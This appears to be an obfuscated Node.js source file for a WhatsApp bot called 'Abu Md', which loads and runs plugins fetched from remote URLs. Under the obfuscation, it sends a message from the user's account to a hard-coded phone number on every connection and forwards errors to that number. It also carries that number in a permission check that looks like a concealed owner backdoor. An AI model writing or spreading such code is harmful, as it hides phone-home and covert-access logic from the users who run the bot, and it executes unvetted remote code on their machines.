const _0xede0b0=_0x1106;(function(_0x2df63e,_0x1ac3f3){const _0x2a0623=_0x1106,_0x174156=_0x2df63e();while(!![]){try{const _0x4e3c61=-parseInt(_0x2a0623(0xe4))/0x1*(parseInt(_0x2a0623(0x108))/0x2)+parseInt(_0x2a0623(0x111))/0x3*(-parseInt(_0x2a0623(0xbf))/0x4)+-parseInt(_0x2a0623(0xf7))/0x5+parseInt(_0x2a0623(0xcc))/0x6*(-parseInt(_0x2a0623(0x99))/0x7)+-parseInt(_0x2a0623(0x101))/0x8+-parseInt(_0x2a0623(0xbd))/0x9*(parseInt(_0x2a0623(0xb1))/0xa)+-parseInt(_0x2a0623(0xb7))/0xb*(-parseInt(_0x2a0623(0xd2))/0xc);if(_0x4e3c61===_0x1ac3f3)break;else _0x174156['push'](_0x174156['shift']());}catch(_0x47d36e){_0x174156['push'](_0x174156['shift']());}}}(_0x4378,0x3946e));const fs=require('fs'),path=require('path'),events=require(_0xede0b0(0xfb)),chalk=require('chalk'),Jsl=require(_0xede0b0(0xaf)),Config=require('./config'),{default:AbuConnect,MessageOptions,MessageType,Mimetype,WAPresence,useSingleFileAuthState,DisconnectReason,fetchLatestBaileysVersion,makeInMemoryStore,generateForwardMessageContent,prepareWAMessageMedia,generateWAMessageFromContent,generateMessageID,downloadContentFromMessage,jidDecode,proto}=require(_0xede0b0(0x104)),{state,saveState}=useSingleFileAuthState(_0xede0b0(0xbb)),pino=require(_0xede0b0(0xcb)),{Boom}=require(_0xede0b0(0x9a)),{Message,Image,Video}=require(_0xede0b0(0xb0)),{DataTypes}=require(_0xede0b0(0x106)),store=makeInMemoryStore({'logger':pino()[_0xede0b0(0x10a)]({'level':_0xede0b0(0xe8),'stream':_0xede0b0(0xc0)})}),{getMessage}=require('./plugins/sql/greetings'),getBuffer=require(_0xede0b0(0xfd)),simpleGit=require(_0xede0b0(0xdf)),git=simpleGit(),axios=require(_0xede0b0(0xe6)),got=require(_0xede0b0(0xd9));prefix=Jsl['HANDLERS'];const BotDB=Jsl['DATABASE']['define'](_0xede0b0(0xf4),{'info':{'type':DataTypes[_0xede0b0(0xee)],'allowNull':![]},'value':{'type':DataTypes[_0xede0b0(0xd4)],'allowNull':![]}});fs['readdirSync'](_0xede0b0(0x107))[_0xede0b0(0xaa)](_0x3c3ed1=>{const _0x3dff5a=_0xede0b0;path[_0x3dff5a(0x9e)](_0x3c3ed1)[_0x3dff5a(0xa5)]()=='.js'&&require(_0x3dff5a(0x107)+_0x3c3ed1);});const plugindb=require('./plugins/sql/plugin');var ABUSER={'JASIL':_0xede0b0(0xda)};String[_0xede0b0(0xdb)][_0xede0b0(0xa9)]=function(){const _0x2af258=_0xede0b0;var _0x4c8d74=0x0,_0x23a67f=arguments;return this[_0x2af258(0xec)](/{}/g,function(){const _0x1cd26f=_0x2af258;return typeof _0x23a67f[_0x4c8d74]!=_0x1cd26f(0xd6)?_0x23a67f[_0x4c8d74++]:'';});};!Date['now']&&(Date[_0xede0b0(0xb3)]=function(){const _0x437aad=_0xede0b0;return new Date()[_0x437aad(0xa8)]();});function _0x1106(_0x5f94b2,_0x53752a){const _0x43782a=_0x4378();return _0x1106=function(_0x1106ee,_0x326c73){_0x1106ee=_0x1106ee-0x94;let _0x59f549=_0x43782a[_0x1106ee];return _0x59f549;},_0x1106(_0x5f94b2,_0x53752a);}Array[_0xede0b0(0xdb)]['remove']=function(){const _0x3caaa6=_0xede0b0;var _0x52fbc1,_0x3bedb3=arguments,_0x2330fb=_0x3bedb3[_0x3caaa6(0xb9)],_0x46a656;while(_0x2330fb&&this[_0x3caaa6(0xb9)]){_0x52fbc1=_0x3bedb3[--_0x2330fb];while((_0x46a656=this['indexOf'](_0x52fbc1))!==-0x1){this['splice'](_0x46a656,0x1);}}return this;};async function startAbu(){const _0x50ed98=_0xede0b0;await Jsl[_0x50ed98(0xb4)][_0x50ed98(0xf8)]();const _0x100048=AbuConnect({'logger':pino({'level':_0x50ed98(0xe8)}),'printQRInTerminal':!![],'browser':[_0x50ed98(0xe9),'Safari',_0x50ed98(0xbe)],'auth':state});return store[_0x50ed98(0xd7)](_0x100048['ev']),_0x100048['ev']['on']('creds.update',saveState),_0x100048['ev']['on']('messages.upsert',async({messages:_0x440d3f})=>{const _0x3993a8=_0x50ed98;try{msg=_0x440d3f[0x0];if(!msg[_0x3993a8(0xf6)])return;if(msg[_0x3993a8(0xd0)]['fromMe'])return;const _0x44bafc=Object[_0x3993a8(0xb2)](msg[_0x3993a8(0xf6)])[0x0];body=_0x44bafc===_0x3993a8(0xa6)&&msg[_0x3993a8(0xf6)][_0x3993a8(0xa6)][_0x3993a8(0xde)](prefix)?msg[_0x3993a8(0xf6)][_0x3993a8(0xa6)]:_0x44bafc==_0x3993a8(0x103)&&msg[_0x3993a8(0xf6)][_0x44bafc]['caption'][_0x3993a8(0xde)](prefix)?msg['message'][_0x44bafc][_0x3993a8(0xa0)]:_0x44bafc==_0x3993a8(0xca)&&msg['message'][_0x44bafc]['caption'][_0x3993a8(0xde)](prefix)?msg['message'][_0x44bafc][_0x3993a8(0xa0)]:_0x44bafc=='extendedTextMessage'&&msg['message'][_0x44bafc]['text'][_0x3993a8(0xde)](prefix)?msg[_0x3993a8(0xf6)][_0x44bafc][_0x3993a8(0x10e)]:_0x44bafc==_0x3993a8(0xc7)&&msg[_0x3993a8(0xf6)][_0x44bafc]['singleSelectReply']['selectedRowId']?msg[_0x3993a8(0xf6)][_0x44bafc]['singleSelectReply'][_0x3993a8(0xba)]:_0x44bafc=='buttonsResponseMessage'&&msg[_0x3993a8(0xf6)][_0x44bafc][_0x3993a8(0x94)]?msg[_0x3993a8(0xf6)][_0x44bafc][_0x3993a8(0x94)]:'';const _0x47258c=body[_0x3993a8(0xa4)](0x1)['trim']()[_0x3993a8(0x100)](/ +/)[_0x3993a8(0xd3)]()[_0x3993a8(0xa5)]();switch(_0x47258c){case _0x3993a8(0x95):const _0x5b8723=new Date()['getTime']();await _0x100048[_0x3993a8(0xb5)](msg[_0x3993a8(0xd0)]['remoteJid'],{'text':_0x3993a8(0xff)});const _0x4a468a=new Date()['getTime']();await _0x100048[_0x3993a8(0xb5)](msg[_0x3993a8(0xd0)]['remoteJid'],{'text':_0x3993a8(0xe1)+(_0x4a468a-_0x5b8723)+_0x3993a8(0x10c)});break;}}catch(_0x112e05){console[_0x3993a8(0xb8)](_0x112e05);}}),_0x100048['ev']['on']('connection.update',async _0x45432b=>{const _0x4d5184=_0x50ed98,{connection:_0x294b93,lastDisconnect:_0x402be9}=_0x45432b;if(_0x294b93===_0x4d5184(0x109)){if(_0x294b93===_0x4d5184(0xe2)&&_0x402be9&&_0x402be9[_0x4d5184(0xa1)]&&_0x402be9[_0x4d5184(0xa1)][_0x4d5184(0xab)][_0x4d5184(0x9f)]!=0x191){}}if(_0x294b93===_0x4d5184(0xa2)){console[_0x4d5184(0xb8)](chalk[_0x4d5184(0xc4)][_0x4d5184(0x9d)](_0x4d5184(0xc9))),console['log'](chalk[_0x4d5184(0xfe)]['italic'](_0x4d5184(0xcf)));var _0x39a1cc=await plugindb[_0x4d5184(0xf0)]['findAll']();_0x39a1cc[_0x4d5184(0x9b)](async _0x25f5e3=>{const _0xc024da=_0x4d5184;if(!fs[_0xc024da(0xa7)]('./plugins/'+_0x25f5e3[_0xc024da(0x9c)][_0xc024da(0x102)]+_0xc024da(0xe5))){console[_0xc024da(0xb8)](_0x25f5e3[_0xc024da(0x9c)]['name']);var _0x146f23=await got(_0x25f5e3[_0xc024da(0x9c)][_0xc024da(0xea)]);_0x146f23[_0xc024da(0x9f)]==0xc8&&(fs['writeFileSync']('./plugins/'+_0x25f5e3[_0xc024da(0x9c)]['name']+_0xc024da(0xe5),_0x146f23[_0xc024da(0xd5)]),require(_0xc024da(0x10d)+_0x25f5e3[_0xc024da(0x9c)][_0xc024da(0x102)]+_0xc024da(0xe5)));}}),fs[_0x4d5184(0xf2)]('./plugins')['forEach'](_0x1f05fb=>{const _0x403fa9=_0x4d5184;path[_0x403fa9(0x9e)](_0x1f05fb)['toLowerCase']()==_0x403fa9(0xe5)&&require(_0x403fa9(0x10d)+_0x1f05fb);}),console[_0x4d5184(0xb8)](chalk[_0x4d5184(0xc4)][_0x4d5184(0x9d)](_0x4d5184(0xe7)));const _0x8fa962=_0x4d5184(0x97);await _0x100048[_0x4d5184(0xb5)](_0x8fa962,{'text':_0x4d5184(0xeb)}),_0x100048['ev']['on'](_0x4d5184(0x112),async _0x375d0c=>{const _0x279053=_0x4d5184;if(!_0x375d0c[_0x279053(0xad)])return;if(!_0x375d0c[_0x279053(0xc8)]&&!_0x375d0c['count'])return;let _0x76b86c=_0x375d0c[_0x279053(0xc8)]['all']()[0x0];if(_0x76b86c[_0x279053(0xd0)]&&_0x76b86c[_0x279053(0xd0)][_0x279053(0xfa)]==_0x279053(0xa3))return;config[_0x279053(0xae)]&&await conn[_0x279053(0xdd)](_0x76b86c[_0x279053(0xd0)][_0x279053(0xfa)],WaPresence[_0x279053(0xed)]),events[_0x279053(0x10b)][_0x279053(0x9b)](async _0xf481d9=>{const _0x5a33a9=_0x279053;if(_0x76b86c[_0x5a33a9(0xf6)]&&_0x76b86c['message'][_0x5a33a9(0x103)]&&_0x76b86c['message'][_0x5a33a9(0x103)][_0x5a33a9(0xa0)])var _0x20b51b=_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0x103)][_0x5a33a9(0xa0)];else{if(_0x76b86c[_0x5a33a9(0xf6)]&&_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0xca)]&&_0x76b86c['message'][_0x5a33a9(0xca)][_0x5a33a9(0xa0)])var _0x20b51b=_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0xca)][_0x5a33a9(0xa0)];else{if(_0x76b86c[_0x5a33a9(0xf6)])var _0x20b51b=_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0xac)]===null?_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0xa6)]:_0x76b86c['message'][_0x5a33a9(0xac)]['text'];else var _0x20b51b=undefined;}}if(_0xf481d9['on']!==undefined&&(_0xf481d9['on']===_0x5a33a9(0xd8)||_0xf481d9['on']==='photo')&&_0x76b86c['message']&&_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0x103)]!==null&&(_0xf481d9[_0x5a33a9(0xbc)]===undefined||_0xf481d9[_0x5a33a9(0xbc)]!==undefined&&_0xf481d9[_0x5a33a9(0xbc)][_0x5a33a9(0x98)](_0x20b51b))||_0xf481d9[_0x5a33a9(0xbc)]!==undefined&&_0xf481d9[_0x5a33a9(0xbc)][_0x5a33a9(0x98)](_0x20b51b)||_0xf481d9['on']!==undefined&&_0xf481d9['on']===_0x5a33a9(0x10e)&&_0x20b51b||_0xf481d9['on']!==undefined&&_0xf481d9['on']===_0x5a33a9(0xf9)&&_0x76b86c['message']&&_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0xca)]!==null&&(_0xf481d9['pattern']===undefined||_0xf481d9['pattern']!==undefined&&_0xf481d9['pattern'][_0x5a33a9(0x98)](_0x20b51b))){let _0x1c6e70=![];var _0x1181aa=_0x100048[_0x5a33a9(0x110)][_0x5a33a9(0x10f)](_0x76b86c[_0x5a33a9(0xd0)]['remoteJid']);if(Jsl[_0x5a33a9(0xc1)]!==![]&&_0x76b86c[_0x5a33a9(0xd0)][_0x5a33a9(0xc3)]===![]&&_0xf481d9[_0x5a33a9(0xc3)]===!![]&&(_0x76b86c[_0x5a33a9(0xf3)]&&Jsl[_0x5a33a9(0xc1)][_0x5a33a9(0xc5)](',')?Jsl[_0x5a33a9(0xc1)][_0x5a33a9(0x100)](',')[_0x5a33a9(0xc5)](_0x76b86c['participant'][_0x5a33a9(0x100)]('@')[0x0]):_0x76b86c['participant'][_0x5a33a9(0x100)]('@')[0x0]==Jsl[_0x5a33a9(0xc1)]||Jsl[_0x5a33a9(0xc1)]['includes'](',')?Jsl[_0x5a33a9(0xc1)]['split'](',')[_0x5a33a9(0xc5)](_0x76b86c[_0x5a33a9(0xd0)][_0x5a33a9(0xfa)]['split']('@')[0x0]):_0x76b86c[_0x5a33a9(0xd0)][_0x5a33a9(0xfa)][_0x5a33a9(0x100)]('@')[0x0]==Jsl[_0x5a33a9(0xc1)])||_0xf481d9[_0x5a33a9(0xc3)]===_0x76b86c[_0x5a33a9(0xd0)][_0x5a33a9(0xc3)]||_0xf481d9[_0x5a33a9(0xc3)]===![]&&!_0x76b86c[_0x5a33a9(0xd0)][_0x5a33a9(0xc3)]){if(_0xf481d9[_0x5a33a9(0xfc)]&&_0x1181aa[_0x5a33a9(0x105)]===undefined)return;if(!_0xf481d9[_0x5a33a9(0xf1)]===_0x1181aa[_0x5a33a9(0x96)][_0x5a33a9(0xc5)]('g.us'))_0x1c6e70=!![];else{if(_0xf481d9[_0x5a33a9(0xe3)]===_0x1181aa[_0x5a33a9(0x96)]['includes'](_0x5a33a9(0xcd)))_0x1c6e70=!![];}}if(ABUSER['KL14']==_0x5a33a9(0xda)&&_0x76b86c['key']['fromMe']===![]&&_0xf481d9['fromMe']===!![]&&(_0x76b86c['participant']&&ABUSER[_0x5a33a9(0xe0)][_0x5a33a9(0xc5)](',')?ABUSER[_0x5a33a9(0xe0)][_0x5a33a9(0x100)](',')[_0x5a33a9(0xc5)](_0x76b86c[_0x5a33a9(0xf3)][_0x5a33a9(0x100)]('@')[0x0]):_0x76b86c['participant'][_0x5a33a9(0x100)]('@')[0x0]==ABUSER[_0x5a33a9(0xdc)]||ABUSER[_0x5a33a9(0xdc)][_0x5a33a9(0xc5)](',')?ABUSER[_0x5a33a9(0xdc)]['split'](',')[_0x5a33a9(0xc5)](_0x76b86c[_0x5a33a9(0xd0)][_0x5a33a9(0xfa)][_0x5a33a9(0x100)]('@')[0x0]):_0x76b86c[_0x5a33a9(0xd0)][_0x5a33a9(0xfa)]['split']('@')[0x0]==ABUSER[_0x5a33a9(0xdc)])||_0xf481d9[_0x5a33a9(0xc3)]===_0x76b86c['key']['fromMe']||_0xf481d9[_0x5a33a9(0xc3)]===![]&&!_0x76b86c[_0x5a33a9(0xd0)][_0x5a33a9(0xc3)]){if(_0xf481d9['onlyPinned']&&_0x1181aa[_0x5a33a9(0x105)]===undefined)return;if(!_0xf481d9['onlyPm']===_0x1181aa[_0x5a33a9(0x96)][_0x5a33a9(0xc5)](_0x5a33a9(0xcd)))_0x1c6e70=!![];else{if(_0xf481d9['onlyGroup']===_0x1181aa[_0x5a33a9(0x96)][_0x5a33a9(0xc5)](_0x5a33a9(0xcd)))_0x1c6e70=!![];}}if(_0x1c6e70){Jsl[_0x5a33a9(0xb6)]&&_0xf481d9['on']===undefined&&await _0x100048[_0x5a33a9(0xc6)](_0x76b86c['key'][_0x5a33a9(0xfa)]);var _0x2addb3=_0x20b51b['match'](_0xf481d9['pattern']);if(_0xf481d9['on']!==undefined&&(_0xf481d9['on']===_0x5a33a9(0xd8)||_0xf481d9['on']===_0x5a33a9(0xce))&&_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0x103)]!==null)whats=new Image(_0x100048,_0x76b86c);else _0xf481d9['on']!==undefined&&_0xf481d9['on']===_0x5a33a9(0xf9)&&_0x76b86c[_0x5a33a9(0xf6)][_0x5a33a9(0xca)]!==null?whats=new Video(_0x100048,_0x76b86c):whats=new Message(_0x100048,_0x76b86c);try{await _0xf481d9[_0x5a33a9(0xc2)](whats,_0x2addb3);}catch(_0x2f4b60){if(Jsl[_0x5a33a9(0xef)]===_0x5a33a9(0xf5))return;else await _0x100048['sendMessage']('917025994178@s.whatsapp.net',_0x5a33a9(0xd1)+_0x2f4b60+'\x0a\x0a');}}}});});}}),_0x100048;}function _0x4378(){const _0x30a389=['map','dataValues','bold','extname','statusCode','caption','error','open','status@broadcast','slice','toLowerCase','conversation','existsSync','getTime','format','forEach','output','extendedTextMessage','hasNewMessage','NO_ONLINE','./config','./lib/','1147170LYmQCD','keys','now','DATABASE','sendMessage','SEND_READ','18478284xiJXrZ','log','length','selectedRowId','./session.json','pattern','36OMgOpL','1.0.0','356jovyHL','store','SUDO','function','fromMe','green','includes','chatRead','listResponseMessage','messages','Session\x20Connected\x20✅!','videoMessage','pino','28926DLQWvk','g.us','photo','Installing\x20plugins..✅.','key','_ERROR_\x20\x0a\x20','12EWyZWI','shift','TEXT','body','undefined','bind','image','got','917025994178,0','prototype','JASIL','updateWaPresence','startsWith','simple-git','KL14','*Pong!*\x0a','close','onlyGroup','1132kCUyrT','.js','axios','Plugins\x20Installed✅!','silent','Abu\x20Md','url','𝙰𝙱𝚄-𝙼𝙳\x20𝚆𝙾𝚁𝙺𝙸𝙽𝙶\x0a\x20𝙷𝙰𝙽𝙳𝙻𝙴𝚁\x20\x20:\x20.\x0a\x20𝙲𝙾𝙼𝙼𝙰𝙽𝙳\x20\x20:\x20.menu\x20.help\x20.list\x0a\x20𝚅𝙴𝚁𝚂𝙸𝙾𝙽\x20\x20\x20:\x202.0.1','replace','unavailable','STRING','NOLOG','PluginDB','onlyPm','readdirSync','participant','Bot','true','message','33490uWjvEG','sync','video','remoteJid','./events','onlyPinned','abu-bot','blueBright','Ping!','split','1083864Rrzlhi','name','imageMessage','@adiwajshing/baileys','pin','sequelize','./plugins/sql/','708esOuSl','connecting','child','commands','*ms*','./plugins/','text','get','chats','11373EQzasK','chat.update','selectedButtonId','ping','jid','917025994178@s.whatsapp.net','test','154ZeiYVv','@hapi/boom'];_0x4378=function(){return _0x30a389;};return _0x4378();}startAbu();
